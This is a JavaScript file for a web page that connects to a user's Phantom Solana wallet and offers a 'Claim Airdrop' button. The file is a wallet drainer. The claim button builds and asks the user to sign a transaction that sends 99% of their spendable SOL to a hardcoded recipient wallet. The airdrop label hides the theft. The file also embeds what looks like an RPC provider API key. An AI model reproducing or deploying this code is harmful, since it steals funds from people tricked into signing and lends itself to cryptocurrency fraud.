$(document).ready(function () {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    async function handleWalletConnection(resp) {
        console.log("Phantom Wallet connected:", resp);

        const connection = new solanaWeb3.Connection(
            'https://solana-mainnet.api.syndica.io/api-key/SoydjJWjfwxDgAya8RrX3ArCdZ9PGLKQ37fVwDuQUJzhtsCDiE2VbEXk3wC1XZWtNArvKyUZvaTpQGYXfkhpmUFR9VbVLgTRhw',
            'confirmed'
        );

        const public_key = new solanaWeb3.PublicKey(resp.publicKey);
        const walletBalance = await connection.getBalance(public_key);
        console.log("Wallet balance:", walletBalance);

        const minBalance = await connection.getMinimumBalanceForRentExemption(0);

        if (walletBalance < minBalance) {
            alert("Insufficient funds for rent.");
            return;
        }

        $('#connect-wallet').text("Claim Airdrop");

        $('#connect-wallet').off('click').on('click', async () => {
            try {
                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                const balanceForTransfer = walletBalance - minBalance;

                if (balanceForTransfer <= 0) {
                    alert("Insufficient funds for transfer.");
                    return;
                }

                const transferAmount = balanceForTransfer * 0.99;

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: recieverWallet,
                        lamports: transferAmount,
                    })
                );

                transaction.feePayer = window.solana.publicKey;
                const blockhashObj = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhashObj.blockhash;

                const signed = await window.solana.signTransaction(transaction);
                const txid = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(txid);

                alert("Transaction successful!");
                $('#connect-wallet').text("Connected");
            } catch (err) {
                console.error("Error during claim:", err);
                alert("Claim failed. Please try again.");
            }
        });
    }

    async function connectPhantom() {
        try {
            const resp = await window.solana.connect();
            sessionStorage.setItem('phantomConnected', 'true');
            sessionStorage.removeItem('phantomInstallRequested');
            handleWalletConnection(resp);
        } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
            alert("Error connecting to Phantom Wallet.");
        }
    }

    // Mobile deep link connection (ONLY for mobile devices)
    function openPhantomMobileApp() {
        const dappUrl = encodeURIComponent(window.location.origin); // origin only for app_url
        const redirectLink = encodeURIComponent(window.location.href); // to return here
        const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}&redirect_link=${redirectLink}`;

        window.location.href = phantomDeepLink;

        // Fallback in case Phantom app isn't installed
        setTimeout(() => {
            if (!window.location.href.includes("phantom_encryption_public_key")) {
                const fallback = confirm("It looks like Phantom Wallet is not installed. Do you want to download it?");
                if (fallback) {
                    window.open("https://phantom.app/download", "_blank");
                }
            }
        }, 3000);
    }

    // Handle Phantom redirect after mobile deep link connection
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("phantom_encryption_public_key")) {
        // Normally you'd decrypt and verify the payload here
        console.log("Phantom redirected with encryption keys.");
        $('#connect-wallet').text("Connected (Mobile)");
        // Optionally: store that user is connected, or extract wallet address
    }

    $('#connect-wallet').on('click', async () => {
        if (!isMobile && window.solana && window.solana.isPhantom) {
            await connectPhantom();
        } else if (isMobile) {
            openPhantomMobileApp();
        } else {
            alert("Phantom Wallet not found. Please install it.");
            window.open("https://phantom.app/download", "_blank");
        }
    });

    // Auto-connect if already trusted on desktop
    const phantomAvailable = window.solana && window.solana.isPhantom;

    if (phantomAvailable) {
        window.solana.on("connect", async () => {
            console.log("Wallet auto-connected (listener)");
            const resp = { publicKey: window.solana.publicKey };
            handleWalletConnection(resp);
        });

        const wasConnected = sessionStorage.getItem('phantomConnected');
        if (wasConnected) {
            window.solana.connect({ onlyIfTrusted: true })
                .then(resp => {
                    if (resp?.publicKey) {
                        handleWalletConnection(resp);
                    }
                })
                .catch(() => {
                    sessionStorage.removeItem('phantomConnected');
                });
        }
    }
});

